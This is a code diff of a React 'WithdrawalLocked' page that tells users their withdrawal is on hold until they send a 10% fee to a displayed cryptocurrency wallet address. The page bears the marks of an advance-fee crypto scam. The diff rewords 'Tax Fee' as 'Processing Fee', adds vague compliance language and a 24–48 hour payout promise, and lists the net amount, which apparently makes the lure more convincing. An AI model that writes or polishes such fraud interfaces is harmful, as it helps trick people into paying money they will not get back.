@@ -31,7 +31,7 @@ export default function WithdrawalLocked() {
   const requested = Number(amount) || 0;
   const taxRate = 0.1; // 10% withholding
   const taxAmount = Number((requested * taxRate).toFixed(2));
-  
+  const netAmount = Number((requested - taxAmount).toFixed(2));
 
   return (
     <Box
@@ -62,12 +62,13 @@ export default function WithdrawalLocked() {
           </Typography>
 
           <Typography variant="h4" fontWeight="bold" textAlign="center">
-            Tax Fee Required
+            Processing Fee Required
           </Typography>
 
-          <Typography variant="h5" color="text.secondary" textAlign="center">
-            Your withdrawal is on hold until the required tax fee is confirmed.
-            This helps us comply with payout regulations.
+          <Typography variant="h6" color="text.secondary" textAlign="center">
+            Your withdrawal is currently on hold while we complete required
+            compliance checks. A processing fee is required to cover tax
+            reporting and payout handling.
           </Typography>
 
           <Paper
@@ -94,10 +95,20 @@ export default function WithdrawalLocked() {
 
               <Stack direction="row" justifyContent="space-between">
                 <Typography color="text.secondary">
-                  Tax Fee ({Math.round(taxRate * 100)}%)
+                  Processing Fee ({Math.round(taxRate * 100)}%)
                 </Typography>
                 <Typography fontWeight="bold">
                   {taxAmount.toLocaleString("en-US", {
+                    style: "currency",
+                    currency: "USD",
+                  })}
+                </Typography>
+              </Stack>
+
+              <Stack direction="row" justifyContent="space-between">
+                <Typography color="text.secondary">Amount after fee</Typography>
+                <Typography fontWeight="bold">
+                  {netAmount.toLocaleString("en-US", {
                     style: "currency",
                     currency: "USD",
                   })}
@@ -108,37 +119,40 @@ export default function WithdrawalLocked() {
             </Stack>
           </Paper>
 
-          <Typography variant="h5" color="text.secondary" textAlign="center">
-            To pay your{" "}
-            {taxAmount.toLocaleString("en-US", {
-              style: "currency",
-              currency: "USD",
-            })}{" "}
-            Tax fee and automatically activate your account for withdrawal, Please send it to the below {walletName} wallet address
+          <Typography variant="body1" color="text.secondary" textAlign="center">
+            To complete this payout, please send the processing fee of{" "}
+            <strong>
+              {taxAmount.toLocaleString("en-US", {
+                style: "currency",
+                currency: "USD",
+              })}
+            </strong>{" "}
+            to the {walletName || "selected"} wallet address shown below. Once
+            we confirm receipt, your withdrawal will be processed within 24–48
+            business hours.
           </Typography>
 
-         
-            <Paper
-              variant="outlined"
-              sx={{ width: "100%", p: 2, textAlign: "center" }}
+          <Paper
+            variant="outlined"
+            sx={{ width: "100%", p: 2, textAlign: "center" }}
+          >
+            <Typography variant="body2" color="text.secondary">
+              {walletName || "Wallet"}
+            </Typography>
+
+            <Typography variant="body1" sx={{ wordBreak: "break-all" }}>
+              {activateWalletAddress || "No address available"}
+            </Typography>
+
+            <Button
+              onClick={handleCopy}
+              variant="contained"
+              color="success"
+              sx={{ mt: 2 }}
             >
-              <Typography variant="body2" color="text.secondary">
-              {walletName}
-              </Typography>
-
-              <Typography variant="body1" sx={{ wordBreak: "break-all" }}>
-                {activateWalletAddress}
-              </Typography>
-
-              <Button
-                onClick={handleCopy}
-                variant="contained"
-                color="success"
-                sx={{ mt: 2 }}
-              >
-                Copy Wallet Address
-              </Button>
-            </Paper>
+              Copy Address
+            </Button>
+          </Paper>
 
           <Stack
             direction="row"
